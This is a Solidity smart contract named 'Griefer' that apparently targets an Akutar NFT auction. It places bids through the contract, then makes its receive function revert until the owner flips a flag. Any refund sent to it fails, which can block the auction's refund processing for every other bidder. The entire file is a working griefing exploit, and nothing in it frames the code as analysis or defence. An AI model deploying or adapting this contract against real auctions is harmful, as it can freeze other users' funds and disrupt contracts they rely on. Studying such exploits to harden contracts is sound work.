// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IAkutarAuction {
    function bid(uint8 amount) external payable;
}

contract Griefer is Ownable {
    bool flag;

    // Set flag to false upon initialization
    constructor() {
        flag = false;
    }

    // Bid on the Akutar Auction through this contract
    function bidAuction(address auctionAddr, uint8 amount)
        external
        payable
        onlyOwner
    {
        IAkutarAuction auction = IAkutarAuction(auctionAddr);
        auction.bid{value: msg.value}(amount);
    }

    // Set flag to true to unblock the receive function
    function unblock() external onlyOwner {
        flag = true;
    }

    // Function to withdraw any funds after done griefing
    function withdraw() external onlyOwner {
        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(sent);
    }

    // Payment txs made to this contract revert if flag != true
    receive() external payable {
        require(flag);
    }
}
